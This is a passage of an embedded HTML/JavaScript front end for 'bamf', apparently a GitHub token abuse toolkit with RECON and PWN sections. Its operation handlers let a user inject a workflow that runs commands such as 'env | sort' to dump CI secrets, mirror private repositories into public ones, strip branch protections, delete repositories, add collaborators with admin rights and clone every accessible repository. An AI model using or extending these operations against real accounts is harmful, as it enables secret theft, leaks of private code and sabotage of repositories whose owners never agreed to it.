    .repo-desc {
      max-width: 380px;
      color: var(--muted);
    }

    .tag {
      display: inline-flex;
      align-items: center;
      min-height: 24px;
      border-radius: 999px;
      padding: 3px 8px;
      font-size: 12px;
      font-weight: 700;
      background: var(--chip);
      color: var(--ink);
      margin-right: 5px;
      margin-bottom: 4px;
    }

    .tag.private { background: color-mix(in srgb, var(--warn) 18%, transparent); color: var(--warn); }
    .tag.public { background: color-mix(in srgb, var(--good) 18%, transparent); color: var(--good); }
    .tag.archived { background: color-mix(in srgb, var(--bad) 18%, transparent); color: var(--bad); }

    .settings {
      padding: 16px 18px;
      display: grid;
      grid-template-columns: 190px minmax(170px, 1fr) minmax(230px, 1.2fr) auto;
      gap: 12px;
      align-items: end;
    }

    .toggle-row {
      min-height: 40px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--ink);
      font-weight: 700;
    }

    .toggle-row input {
      width: 18px;
      min-height: 18px;
      accent-color: var(--accent);
    }

    .hint {
      color: var(--muted);
      font-size: 13px;
      font-weight: 500;
    }

    .section-head {
      padding: 16px 18px 0;
      display: flex;
      align-items: baseline;
      justify-content: space-between;
      gap: 12px;
    }

    .section-head h2 {
      margin: 0;
      font-size: 18px;
      letter-spacing: 0;
    }

    .section-head p {
      margin: 4px 0 0;
      color: var(--muted);
      font-size: 14px;
    }

    .operation-tabs {
      padding: 14px 18px 0;
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .operation-tabs button {
      min-height: 34px;
      padding: 6px 12px;
    }

    .operation-tabs button.active {
      background: var(--accent);
      color: #fff;
    }

    .operation-grid {
      padding: 14px 18px 18px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
      gap: 12px;
    }

    .operation {
      border: 1px solid var(--line);
      background: var(--panel-2);
      border-radius: 8px;
      padding: 14px;
      min-height: 132px;
      display: grid;
      align-content: space-between;
      gap: 12px;
    }

    .operation h3 {
      margin: 0;
      font-size: 15px;
      letter-spacing: 0;
    }

    .operation p {
      margin: 6px 0 0;
      color: var(--muted);
      font-size: 13px;
    }

    .operation-foot {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
    }

    .log-toolbar {
      padding: 14px 18px 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      flex-wrap: wrap;
    }

    .log-actions {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .log-view {
      margin: 14px 18px 18px;
      min-height: 260px;
      max-height: 420px;
      overflow: auto;
      border: 1px solid var(--line);
      border-radius: 8px;
      background: #05080c;
      color: #d8f7e8;
      padding: 12px;
      font: 12px/1.5 Consolas, "Cascadia Mono", "Courier New", monospace;
      white-space: pre-wrap;
    }

    .modal-backdrop {
      position: fixed;
      inset: 0;
      z-index: 20;
      display: grid;
      place-items: start center;
      padding: 72px 18px 24px;
      background: rgba(0, 0, 0, 0.58);
    }

    .modal-backdrop.hidden {
      display: none;
    }

    .settings-modal {
      width: min(720px, 100%);
      max-height: calc(100vh - 96px);
      overflow: auto;
      background: var(--panel);
      color: var(--ink);
      border: 1px solid var(--line);
      border-radius: 8px;
      box-shadow: 0 26px 70px rgba(0, 0, 0, 0.42);
    }

    .modal-head {
      padding: 16px 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      border-bottom: 1px solid var(--line);
    }

    .modal-head h2 {
      margin: 0;
      font-size: 18px;
      letter-spacing: 0;
    }

    .modal-body {
      display: grid;
      gap: 16px;
      padding: 18px;
    }

    .modal-body .auth,
    .modal-body .settings {
      padding: 0;
      border: 0;
      box-shadow: none;
    }

    .modal-body .settings {
      grid-template-columns: 1fr;
    }

    .modal-group {
      display: grid;
      gap: 12px;
      padding-bottom: 16px;
      border-bottom: 1px solid var(--line);
    }

    .modal-group:last-child {
      padding-bottom: 0;
      border-bottom: 0;
    }

    .modal-group h3 {
      margin: 0;
      font-size: 14px;
      letter-spacing: 0;
      color: var(--muted);
      text-transform: uppercase;
    }

    .shell.admin {
      min-height: 100vh;
      display: grid;
      grid-template-columns: 260px minmax(0, 1fr);
      grid-template-rows: auto 1fr;
      background: var(--bg);
    }

    .sidebar {
      grid-row: 1 / span 2;
      background: #111923;
      border-right: 1px solid var(--line);
      color: #d7e2ef;
      min-height: 100vh;
      position: sticky;
      top: 0;
      align-self: start;
      display: grid;
      grid-template-rows: auto 1fr auto;
    }

    [data-skin="light"] .sidebar {
      background: #172033;
      color: #f5f8fc;
    }

    .sidebar-brand {
      padding: 18px;
      display: flex;
      align-items: center;
      gap: 12px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.09);
    }

    .brand-mark {
      width: 38px;
      height: 38px;
      display: grid;
      place-items: center;
      border-radius: 8px;
      background: var(--accent);
      color: #fff;
      font-weight: 900;
    }

    .sidebar-brand h1 {
      margin: 0;
      font-size: 18px;
      letter-spacing: 0;
    }

    .sidebar-brand span {
      display: block;
      margin-top: 2px;
      color: #93a4b8;
      font-size: 12px;
      font-weight: 700;
    }

    .sidebar-nav {
      padding: 14px 10px;
      display: grid;
      align-content: start;
      gap: 6px;
    }

    .nav-link {
      display: flex;
      align-items: center;
      gap: 10px;
      min-height: 40px;
      padding: 8px 12px;
      border-radius: 6px;
      color: #cbd7e5;
      font-weight: 700;
      text-decoration: none;
    }

    .nav-link:hover,
    .nav-link.active {
      background: rgba(40, 163, 199, 0.18);
      color: #fff;
      text-decoration: none;
    }

    .sidebar-foot {
      padding: 14px 18px;
      border-top: 1px solid rgba(255, 255, 255, 0.09);
      color: #93a4b8;
      font-size: 12px;
      font-weight: 700;
    }

    .app-header {
      background: var(--panel);
      border-bottom: 1px solid var(--line);
      color: var(--ink);
    }

    .admin .topbar {
      max-width: none;
      min-height: 62px;
      padding: 10px 20px;
    }

    .page-title h2 {
      margin: 0;
      font-size: 18px;
      letter-spacing: 0;
    }

    .page-title span {
      display: block;
      margin-top: 3px;
      color: var(--muted);
      font-size: 13px;
      font-weight: 600;
    }

    .user-chip {
      display: inline-flex;
      align-items: center;
      min-height: 32px;
      padding: 5px 10px;
      border-radius: 999px;
      background: var(--panel-2);
      color: var(--ink);
      font-size: 13px;
      font-weight: 800;
    }

    .admin main {
      max-width: none;
      margin: 0;
      padding: 20px;
      align-content: start;
    }

    .dashboard-grid {
      display: grid;
      grid-template-columns: repeat(4, minmax(0, 1fr));
      gap: 14px;
    }

    .info-card {
      min-height: 104px;
      padding: 16px;
      border: 1px solid var(--line);
      border-left: 4px solid var(--accent);
      border-radius: 8px;
      background: var(--panel);
      box-shadow: var(--shadow);
      display: grid;
      gap: 8px;
    }

    .info-card strong {
      font-size: 27px;
      line-height: 1;
    }

    .info-card span {
      color: var(--muted);
      font-size: 13px;
      font-weight: 800;
      text-transform: uppercase;
    }

    .content-grid {
      display: grid;
      grid-template-columns: minmax(0, 1.55fr) minmax(340px, 0.9fr);
      gap: 18px;
      align-items: start;
    }

    .card-title {
      padding: 16px 18px;
      display: flex;
      align-items: baseline;
      justify-content: space-between;
      gap: 12px;
      border-bottom: 1px solid var(--line);
    }

    .card-title h2 {
      margin: 0;
      font-size: 17px;
      letter-spacing: 0;
    }

    .card-title p {
      margin: 4px 0 0;
      color: var(--muted);
      font-size: 13px;
    }

    .admin .toolbar {
      grid-template-columns: minmax(190px, 1fr) 150px 170px auto auto;
      border-bottom: 1px solid var(--line);
    }

    .admin .table-wrap {
      border-top: 0;
    }

    .admin .log-view {
      min-height: 474px;
      max-height: 474px;
    }

    .action-output {
      min-height: 220px;
      max-height: 520px;
    }

    .admin .operation-grid {
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
    }

    .empty {
      padding: 34px 18px;
      text-align: center;
      color: var(--muted);
    }

    .hidden { display: none; }

    @media (max-width: 760px) {
      .shell.admin {
        grid-template-columns: 1fr;
      }
      .sidebar {
        position: static;
        min-height: auto;
      }
      .sidebar-nav {
        grid-template-columns: repeat(2, minmax(0, 1fr));
      }
      .topbar, main { padding-left: 16px; padding-right: 16px; }
      .topbar, .account { align-items: flex-start; }
      .auth, .toolbar, .account, .settings {
        grid-template-columns: 1fr;
      }
      .dashboard-grid, .content-grid {
        grid-template-columns: 1fr;
      }
      .metrics { justify-content: flex-start; }
      .brand {
        display: grid;
        gap: 4px;
      }
      .brand span { white-space: normal; }
    }
  </style>
</head>
<body>
  <div class="shell admin">
    <aside class="sidebar">
      <div class="sidebar-brand">
        <div class="brand-mark">b</div>
        <div>
          <h1>bamf</h1>
          <span>GitHub Repo Recon</span>
        </div>
      </div>
      <nav class="sidebar-nav" aria-label="Primary">
        <a class="nav-link active" href="#dashboard"><span>▣</span> Dashboard</a>
        <a class="nav-link" href="#repositories"><span>⌁</span> Repositories</a>
        <a class="nav-link" href="#operationsPanel"><span>◇</span> Operations</a>
        <a class="nav-link" href="#logsPanel"><span>▤</span> Live Logs</a>
        <a class="nav-link" href="#repositories"><span>⇩</span> Exports</a>
      </nav>
      <div class="sidebar-foot">Local web UI · <span id="version">v0.3.0</span></div>
    </aside>

    <header class="app-header">
      <div class="topbar">
        <div class="page-title">
          <h2>Dashboard</h2>
          <span>Repository inventory, operations, exports, and local server activity.</span>
        </div>
        <div class="top-actions">
          <span class="user-chip" id="accountChip">Not connected</span>
          <span class="chip" id="tokenStorageStatus">session token</span>
          <button class="secondary icon-button" id="openSettings" type="button" title="Settings" aria-label="Open settings">&#9881;</button>
        </div>
      </div>
    </header>

    <main id="dashboard">
      <section class="panel status-panel">
        <div class="status" id="status">Open settings to add your GitHub token and load repositories.</div>
      </section>

      <section class="dashboard-grid">
        <div class="info-card">
          <span>Repositories</span>
          <strong id="statRepos">0</strong>
          <small class="hint">Loaded from GitHub</small>
        </div>
        <div class="info-card">
          <span>Private</span>
          <strong id="statPrivate">0</strong>
          <small class="hint">Accessible private repos</small>
        </div>
        <div class="info-card">
          <span>API Remaining</span>
          <strong id="statApi">-</strong>
          <small class="hint">Core rate limit</small>
        </div>
        <div class="info-card">
          <span>Findings</span>
          <strong id="statFindings">0</strong>
          <small class="hint">Web audits pending</small>
        </div>
      </section>

      <section class="panel hidden" id="accountPanel">
        <div class="account">
          <img class="avatar" id="avatar" alt="">
          <div>
            <h2 id="accountName"></h2>
            <p id="accountMeta"></p>
          </div>
          <div class="metrics" id="metrics"></div>
        </div>
      </section>

      <section class="content-grid">
        <section class="panel hidden" id="repoPanel">
          <div class="card-title" id="repositories">
            <div>
              <h2>Repositories</h2>
              <p>Search, filter, sort, and export the loaded repository inventory.</p>
            </div>
            <span class="chip" id="repoCount">0 repos</span>
          </div>
          <div class="toolbar">
            <label>
              Search
              <input id="search" type="search" placeholder="Filter by name, owner, language, description">
            </label>
            <label>
              Visibility
              <select id="visibility">
                <option value="all">All</option>
                <option value="private">Private</option>
                <option value="public">Public</option>
              </select>
            </label>
            <label>
              Sort
              <select id="sort">
                <option value="updated">Recently updated</option>
                <option value="name">Name</option>
                <option value="owner">Owner</option>
              </select>
            </label>
            <button id="refresh" type="button">Refresh</button>
            <button class="secondary" id="exportJson" type="button">Export JSON</button>
          </div>
          <div class="table-wrap">
            <table>
              <thead>
                <tr>
                  <th>Repository</th>
                  <th>Visibility</th>
                  <th>Language</th>
                  <th>Permissions</th>
                  <th>Default Branch</th>
                  <th>Updated</th>
                </tr>
              </thead>
              <tbody id="repoRows"></tbody>
            </table>
          </div>
          <div class="empty hidden" id="empty">No repositories match the current filters.</div>
        </section>

        <section class="panel" id="logsPanel">
          <div class="card-title">
            <div>
              <h2>Live Logs</h2>
              <p>Recent local server activity from bamf_web.log.</p>
            </div>
            <span class="chip" id="logMeta">loading</span>
          </div>
          <div class="log-toolbar">
            <span class="hint">Auto-refreshes every 2 seconds.</span>
            <div class="log-actions">
              <button class="secondary" id="refreshLogs" type="button">Refresh</button>
              <button class="secondary" id="toggleLogs" type="button">Pause</button>
            </div>
          </div>
          <pre class="log-view" id="logView">Loading logs...</pre>
        </section>
      </section>

      <section class="panel" id="operationsPanel">
        <div class="card-title">
          <div>
            <h2>Operations</h2>
            <p>The CLI steps are mirrored here so the web frontend can grow into them.</p>
          </div>
          <span class="chip" id="operationCount">loading</span>
        </div>
        <div class="operation-tabs">
          <button class="secondary active" type="button" data-section="ALL">All</button>
          <button class="secondary" type="button" data-section="RECON">RECON</button>
          <button class="secondary" type="button" data-section="PWN">PWN</button>
        </div>
        <div class="operation-grid" id="operations"></div>
      </section>

      <section class="panel" id="actionOutputPanel">
        <div class="card-title">
          <div>
            <h2>Action Output</h2>
            <p>Results from web-enabled bamf actions.</p>
          </div>
          <span class="chip" id="actionMeta">idle</span>
        </div>
        <pre class="log-view action-output" id="actionOutput">Run an operation to see output here.</pre>
      </section>
    </main>
  </div>

  <div class="modal-backdrop hidden" id="settingsModal" role="dialog" aria-modal="true" aria-labelledby="settingsTitle">
    <section class="settings-modal">
      <div class="modal-head">
        <h2 id="settingsTitle">Settings</h2>
        <button class="secondary icon-button" id="closeSettings" type="button" title="Close settings" aria-label="Close settings">&times;</button>
      </div>
      <div class="modal-body">
        <div class="modal-group">
          <h3>GitHub Token</h3>
          <form class="auth" id="authForm">
            <label>
              Personal Access Token
              <input id="token" type="password" autocomplete="off" placeholder="ghp_... or github_pat_...">
            </label>
            <button id="connect" type="submit">Connect</button>
            <button class="secondary" id="toggleToken" type="button">Show</button>
          </form>
          <div class="hint">The token is sent only to this local app as a Bearer token.</div>
        </div>

        <div class="modal-group">
          <h3>Preferences</h3>
          <div class="settings">
            <label>
              Skin
              <select id="skin">
                <option value="dark">Dark</option>
                <option value="midnight">Midnight</option>
                <option value="matrix">Matrix</option>
                <option value="ember">Ember</option>
                <option value="light">Light</option>
              </select>
            </label>
            <label class="toggle-row">
              <input id="saveToken" type="checkbox">
              Save token in this browser
            </label>
            <div class="hint">Saved tokens use browser localStorage on this machine. Leave this off on shared devices.</div>
            <button class="secondary" id="saveSettings" type="button">Save settings</button>
          </div>
        </div>

        <div class="modal-group">
          <h3>Session</h3>
          <button class="secondary" id="clearToken" type="button">Clear token</button>
        </div>
      </div>
    </section>
  </div>

  <script>
    const TOKEN_KEY = "bamfToken";
    const SAVE_TOKEN_KEY = "bamfSaveToken";
    const SKIN_KEY = "bamfSkin";

    const state = {
      token: "",
      repos: [],
      account: null,
      app: { version: "0.3.0", operations: [] },
      operationSection: "ALL",
      logsPaused: false,
      logTimer: null,
    };

    const els = {
      token: document.querySelector("#token"),
      authForm: document.querySelector("#authForm"),
      connect: document.querySelector("#connect"),
      toggleToken: document.querySelector("#toggleToken"),
      clearToken: document.querySelector("#clearToken"),
      openSettings: document.querySelector("#openSettings"),
      closeSettings: document.querySelector("#closeSettings"),
      settingsModal: document.querySelector("#settingsModal"),
      version: document.querySelector("#version"),
      accountChip: document.querySelector("#accountChip"),
      status: document.querySelector("#status"),
      skin: document.querySelector("#skin"),
      saveToken: document.querySelector("#saveToken"),
      saveSettings: document.querySelector("#saveSettings"),
      tokenStorageStatus: document.querySelector("#tokenStorageStatus"),
      accountPanel: document.querySelector("#accountPanel"),
      avatar: document.querySelector("#avatar"),
      accountName: document.querySelector("#accountName"),
      accountMeta: document.querySelector("#accountMeta"),
      metrics: document.querySelector("#metrics"),
      repoPanel: document.querySelector("#repoPanel"),
      search: document.querySelector("#search"),
      visibility: document.querySelector("#visibility"),
      sort: document.querySelector("#sort"),
      refresh: document.querySelector("#refresh"),
      exportJson: document.querySelector("#exportJson"),
      repoCount: document.querySelector("#repoCount"),
      statRepos: document.querySelector("#statRepos"),
      statPrivate: document.querySelector("#statPrivate"),
      statApi: document.querySelector("#statApi"),
      statFindings: document.querySelector("#statFindings"),
      repoRows: document.querySelector("#repoRows"),
      empty: document.querySelector("#empty"),
      operations: document.querySelector("#operations"),
      operationCount: document.querySelector("#operationCount"),
      operationTabs: document.querySelectorAll("[data-section]"),
      actionOutput: document.querySelector("#actionOutput"),
      actionMeta: document.querySelector("#actionMeta"),
      logView: document.querySelector("#logView"),
      logMeta: document.querySelector("#logMeta"),
      refreshLogs: document.querySelector("#refreshLogs"),
      toggleLogs: document.querySelector("#toggleLogs"),
    };

    loadSettings();
    els.token.value = state.token;

    async function loadAppInfo() {
      try {
        const response = await fetch("/api/app");
        const data = await response.json();
        state.app = data;
        els.version.textContent = `v${data.version}`;
        renderOperations();
      } catch (error) {
        setStatus(`Unable to load app metadata: ${error.message}`, "error");
      }
    }

    function loadSettings() {
      const savedSkin = localStorage.getItem(SKIN_KEY) || "dark";
      const saveToken = localStorage.getItem(SAVE_TOKEN_KEY) === "true";
      els.skin.value = savedSkin;
      els.saveToken.checked = saveToken;
      document.documentElement.dataset.skin = savedSkin;
      state.token = saveToken
        ? localStorage.getItem(TOKEN_KEY) || sessionStorage.getItem(TOKEN_KEY) || ""
        : sessionStorage.getItem(TOKEN_KEY) || "";
      updateTokenStorageStatus();
    }

    function saveSettings(message = "Settings saved.") {
      const skin = els.skin.value;
      const shouldSaveToken = els.saveToken.checked;
      localStorage.setItem(SKIN_KEY, skin);
      localStorage.setItem(SAVE_TOKEN_KEY, String(shouldSaveToken));
      document.documentElement.dataset.skin = skin;

      if (shouldSaveToken && state.token) {
        localStorage.setItem(TOKEN_KEY, state.token);
        sessionStorage.removeItem(TOKEN_KEY);
      } else {
        localStorage.removeItem(TOKEN_KEY);
        if (state.token) {
          sessionStorage.setItem(TOKEN_KEY, state.token);
        }
      }

      updateTokenStorageStatus();
      setStatus(message, "ok");
    }

    function updateTokenStorageStatus() {
      els.tokenStorageStatus.textContent = els.saveToken.checked ? "saved token" : "session token";
    }

    function openSettings() {
      els.settingsModal.classList.remove("hidden");
      setTimeout(() => els.token.focus(), 0);
    }

    function closeSettings() {
      els.settingsModal.classList.add("hidden");
      els.openSettings.focus();
    }

    function setStatus(message, kind = "") {
      els.status.textContent = message;
      els.status.className = `status ${kind}`.trim();
    }

    function setBusy(isBusy) {
      els.connect.disabled = isBusy;
      els.refresh.disabled = isBusy;
      els.exportJson.disabled = isBusy || state.repos.length === 0;
      els.connect.textContent = isBusy ? "Loading..." : "Connect";
    }

    async function api(path) {
      const response = await fetch(path, {
        headers: { Authorization: `Bearer ${state.token}` },
      });
      const data = await response.json().catch(() => ({}));
      if (!response.ok) {
        throw new Error(data.detail || `Request failed: ${response.status}`);
      }
      return data;
    }

    async function apiPost(path, body = {}) {
      const response = await fetch(path, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${state.token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      });
      const data = await response.json().catch(() => ({}));
      if (!response.ok) {
        throw new Error(data.detail || `Request failed: ${response.status}`);
      }
      return data;
    }

    async function connect() {
      state.token = els.token.value.trim();
      if (!state.token) {
        setStatus("Enter a GitHub token first.", "error");
        return;
      }

      if (els.saveToken.checked) {
        localStorage.setItem(TOKEN_KEY, state.token);
        sessionStorage.removeItem(TOKEN_KEY);
      } else {
        sessionStorage.setItem(TOKEN_KEY, state.token);
        localStorage.removeItem(TOKEN_KEY);
      }
      updateTokenStorageStatus();
      setBusy(true);
      setStatus("Connecting to GitHub...");

      try {
        const [account, repoData] = await Promise.all([
          api("/api/whoami"),
          api("/api/repos"),
        ]);
        state.account = account;
        state.repos = repoData.repos;
        renderAccount();
        renderRepos();
        els.exportJson.disabled = false;
        els.accountPanel.classList.remove("hidden");
        els.repoPanel.classList.remove("hidden");
        els.settingsModal.classList.add("hidden");
        setStatus(`Loaded ${repoData.count} repositories.`, "ok");
      } catch (error) {
        setStatus(error.message, "error");
      } finally {
        setBusy(false);
      }
    }

    function renderAccount() {
      const account = state.account;
      els.avatar.src = account.avatar_url || "";
      els.accountName.textContent = account.name ? `${account.name} (${account.login})` : account.login;
      els.accountMeta.textContent = account.html_url;
      els.accountChip.textContent = account.login;
      els.statRepos.textContent = state.repos.length;
      els.statPrivate.textContent = state.repos.filter((repo) => repo.private).length;
      els.statApi.textContent = account.rate_limit.remaining;
      els.statFindings.textContent = state.repos.filter((repo) => repo.archived).length;

      const scopes = account.scopes.length ? account.scopes.join(", ") : "fine-grained or no classic scopes";
      els.metrics.innerHTML = [
        `<span class="chip">${account.public_repos} public</span>`,
        `<span class="chip">${account.private_repos || 0} private</span>`,
        `<span class="chip">${account.rate_limit.remaining}/${account.rate_limit.limit} API left</span>`,
        `<span class="chip">${escapeHtml(scopes)}</span>`,
      ].join("");
    }

    function renderRepos() {
      const term = els.search.value.trim().toLowerCase();
      const visibility = els.visibility.value;
      const sort = els.sort.value;

      let repos = state.repos.filter((repo) => {
        if (visibility === "private" && !repo.private) return false;
        if (visibility === "public" && repo.private) return false;
        if (!term) return true;
        return [
          repo.full_name,
          repo.owner,
          repo.language,
          repo.description,
          repo.default_branch,
        ].filter(Boolean).some((value) => value.toLowerCase().includes(term));
      });

      repos.sort((a, b) => {
        if (sort === "name") return a.full_name.localeCompare(b.full_name);
        if (sort === "owner") return a.owner.localeCompare(b.owner) || a.name.localeCompare(b.name);
        return new Date(b.updated_at || 0) - new Date(a.updated_at || 0);
      });

      els.empty.classList.toggle("hidden", repos.length !== 0);
      els.repoCount.textContent = `${repos.length} shown`;
      els.repoRows.innerHTML = repos.map(repoRow).join("");
    }

    function repoRow(repo) {
      const perms = Object.entries(repo.permissions)
        .filter(([, enabled]) => enabled)
        .map(([name]) => `<span class="tag">${name}</span>`)
        .join("") || `<span class="tag">none</span>`;
      const updated = repo.updated_at ? new Date(repo.updated_at).toLocaleString() : "-";

      return `
        <tr>
          <td>
            <a href="${repo.html_url}" target="_blank" rel="noreferrer">${escapeHtml(repo.full_name)}</a>
            <div class="repo-desc">${escapeHtml(repo.description || "")}</div>
          </td>
          <td>
            <span class="tag ${repo.private ? "private" : "public"}">${repo.private ? "private" : "public"}</span>
            ${repo.archived ? `<span class="tag archived">archived</span>` : ""}
            ${repo.fork ? `<span class="tag">fork</span>` : ""}
          </td>
          <td>${escapeHtml(repo.language || "-")}</td>
          <td>${perms}</td>
          <td>${escapeHtml(repo.default_branch || "-")}</td>
          <td>${escapeHtml(updated)}</td>
        </tr>
      `;
    }

    function renderOperations() {
      const operations = state.app.operations || [];
      const filtered = state.operationSection === "ALL"
        ? operations
        : operations.filter((operation) => operation.section === state.operationSection);

      els.operationCount.textContent = `${filtered.length} shown`;
      els.operations.innerHTML = filtered.map((operation) => `
        <article class="operation">
          <div>
            <h3>${escapeHtml(operation.name)}</h3>
            <p>${escapeHtml(operation.description)}</p>
          </div>
          <div class="operation-foot">
            <span class="tag">${escapeHtml(operation.section)}</span>
            <span class="tag ${operation.status === "Available" ? "public" : ""}">${escapeHtml(operation.status)}</span>
          </div>
          ${operation.web_enabled ? `<button type="button" data-action="${escapeHtml(operation.id)}">Run</button>` : ""}
        </article>
      `).join("");
    }

    function actionPayload(actionId) {
      if (actionId === "create-repo") {
        const name = prompt("Repository name:");
        if (!name) return null;
        const visibility = prompt("Visibility: private or public", "private");
        if (visibility === null) return null;
        const description = prompt("Description (optional):", "") || "";
        return { name, private: visibility.toLowerCase() !== "public", description };
      }
      if (actionId === "add-collaborator") {
        const repo = prompt("Repository owner/name:");
        if (!repo) return null;
        const username = prompt("GitHub username to add:");
        if (!username) return null;
        const permission = prompt("Permission: pull, push, admin, maintain, or triage", "push") || "push";
        if (!confirm(`Add ${username} to ${repo} with ${permission} permission?`)) return null;
        return { repo, username, permission };
      }
      if (actionId === "clone-all-repos") {
        const dest = prompt("Destination directory:", "cloned_repos");
        if (dest === null) return null;
        if (!confirm(`Clone all accessible repositories into ${dest || "cloned_repos"}?`)) return null;
        return { dest };
      }
      if (actionId === "clone-private-to-public") {
        const repo = prompt("Private source repository (owner/name):");
        if (!repo) return null;
        const name = prompt("New public repository name:", `${repo.split("/").pop()}-public`);
        if (!name) return null;
        if (!confirm(`Mirror ${repo} into new public repo ${name}?`)) return null;
        return { repo, name };
      }
      if (actionId === "nuke-branch-protections") {
        const repo = prompt("Repository owner/name:");
        if (!repo) return null;
        const branch = prompt("Branch name (blank for default branch):", "") || "";
        if (!confirm(`Remove branch protection from ${repo}${branch ? `:${branch}` : " default branch"}?`)) return null;
        return { repo, branch };
      }
      if (actionId === "nuke-repo") {
        const repo = prompt("Repository to delete permanently (owner/name):");
        if (!repo) return null;
        const confirmText = prompt(`Type ${repo} to permanently delete it:`);
        if (confirmText !== repo) return null;
        if (!confirm(`Final confirmation: permanently delete ${repo}?`)) return null;
        return { repo, confirm: confirmText };
      }
      if (actionId === "pwn-inject-workflow") {
        const repo = prompt("Repository owner/name:");
        if (!repo) return null;
        const command = prompt("Workflow command to run:", "env | sort") || "env | sort";
        if (!confirm(`Create/update an authorized test workflow in ${repo}?`)) return null;
        return { repo, command };
      }
      if (actionId === "fork-repo") {
        const repo = prompt("Repository to fork (owner/name):");
        if (!repo) return null;
        const name = prompt("Custom fork name (optional):", "") || "";
        const default_branch_only = confirm("Fork default branch only?");
        if (!confirm(`Fork ${repo}${name ? ` as ${name}` : ""}?`)) return null;
        return { repo, name, default_branch_only };
      }
      if (actionId === "scan-secrets") {
        if (!confirm("This will clone repositories temporarily and run gitleaks if installed. Continue?")) return null;
      }
      return {};
    }

    async function runOperation(actionId) {
      if (!state.token) {
        setStatus("Open settings and connect a token before running actions.", "error");
        openSettings();
        return;
      }
      const payload = actionPayload(actionId);
      if (payload === null) return;

      els.actionMeta.textContent = "running";
      els.actionOutput.textContent = `Running ${actionId}...`;
      setStatus(`Running ${actionId}...`);
      try {
        const result = await apiPost(`/api/actions/${actionId}`, payload);
        els.actionOutput.textContent = result.output || "Action completed.";
        els.actionMeta.textContent = "complete";
        setStatus(`${actionId} completed.`, "ok");
        refreshLogs();
      } catch (error) {
        els.actionOutput.textContent = error.message;
        els.actionMeta.textContent = "error";
        setStatus(error.message, "error");
      }
    }

    function exportJson() {
      if (!state.repos.length) {
        setStatus("Load repositories before exporting.", "error");
        return;
      }

      const payload = {
        app: {
          name: "bamf web",
          version: state.app.version,
        },
        exported_at: new Date().toISOString(),
        filters: {
          search: els.search.value,
          visibility: els.visibility.value,
          sort: els.sort.value,
        },
        account: state.account,
        repositories: state.repos,
      };
      const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const timestamp = new Date().toISOString().replaceAll(":", "-").replace(/\.\d{3}Z$/, "Z");
      const link = document.createElement("a");
      link.href = url;
      link.download = `bamf-export-${timestamp}.json`;
      document.body.appendChild(link);
      link.click();
      link.remove();
      URL.revokeObjectURL(url);
      setStatus(`Exported ${state.repos.length} repositories to JSON.`, "ok");
    }

    async function refreshLogs() {
      try {
        const response = await fetch("/api/logs");
        const data = await response.json();
        if (!response.ok) {
          throw new Error(data.detail || `Request failed: ${response.status}`);
        }
        els.logView.textContent = data.lines.length ? data.lines.join("\n") : "No log entries yet.";
        els.logMeta.textContent = `${data.line_count} lines`;
        els.logView.scrollTop = els.logView.scrollHeight;
      } catch (error) {
        els.logView.textContent = `Unable to load logs: ${error.message}`;
        els.logMeta.textContent = "log error";
      }
    }

    function toggleLogs() {
      state.logsPaused = !state.logsPaused;
      els.toggleLogs.textContent = state.logsPaused ? "Resume" : "Pause";
      if (!state.logsPaused) {
        refreshLogs();
      }
    }

    function escapeHtml(value) {
      return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
    }

    els.authForm.addEventListener("submit", (event) => {
      event.preventDefault();
      connect();
    });

    els.refresh.addEventListener("click", connect);
    els.exportJson.addEventListener("click", exportJson);
    els.exportJson.disabled = true;
    els.refreshLogs.addEventListener("click", refreshLogs);
    els.toggleLogs.addEventListener("click", toggleLogs);
    els.search.addEventListener("input", renderRepos);
    els.visibility.addEventListener("change", renderRepos);
    els.sort.addEventListener("change", renderRepos);
    els.openSettings.addEventListener("click", openSettings);
    els.closeSettings.addEventListener("click", closeSettings);
    els.settingsModal.addEventListener("click", (event) => {
      if (event.target === els.settingsModal) {
        closeSettings();
      }
    });
    window.addEventListener("keydown", (event) => {
      if (event.key === "Escape" && !els.settingsModal.classList.contains("hidden")) {
        closeSettings();
      }
    });
    els.skin.addEventListener("change", () => {
      document.documentElement.dataset.skin = els.skin.value;
      saveSettings("Skin updated.");
    });
    els.saveSettings.addEventListener("click", () => saveSettings());
    els.saveToken.addEventListener("change", () => {
      saveSettings(els.saveToken.checked ? "Token saving enabled." : "Token saving disabled.");
    });
    els.operationTabs.forEach((tab) => {
      tab.addEventListener("click", () => {
        state.operationSection = tab.dataset.section;
        els.operationTabs.forEach((button) => button.classList.toggle("active", button === tab));
        renderOperations();
      });
    });
    els.operations.addEventListener("click", (event) => {
      const button = event.target.closest("[data-action]");
      if (button) {
        runOperation(button.dataset.action);
      }
    });

    els.toggleToken.addEventListener("click", () => {
      const showing = els.token.type === "text";
      els.token.type = showing ? "password" : "text";
      els.toggleToken.textContent = showing ? "Show" : "Hide";
    });

    els.clearToken.addEventListener("click", () => {
      sessionStorage.removeItem(TOKEN_KEY);
      localStorage.removeItem(TOKEN_KEY);
      state.token = "";
      state.repos = [];
      state.account = null;
      els.token.value = "";
      els.accountChip.textContent = "Not connected";
      els.statRepos.textContent = "0";
      els.statPrivate.textContent = "0";
      els.statApi.textContent = "-";
      els.statFindings.textContent = "0";
      els.repoCount.textContent = "0 repos";
      els.accountPanel.classList.add("hidden");
      els.repoPanel.classList.add("hidden");
      els.exportJson.disabled = true;
      updateTokenStorageStatus();
      setStatus("Token cleared from this browser.");
    });

    loadAppInfo();
    refreshLogs();
    state.logTimer = setInterval(() => {
      if (!state.logsPaused) {
        refreshLogs();
      }
    }, 2000);

    if (state.token) {
      connect();
    } else {
      openSettings();
    }
  </script>
</body>
</html>
"""


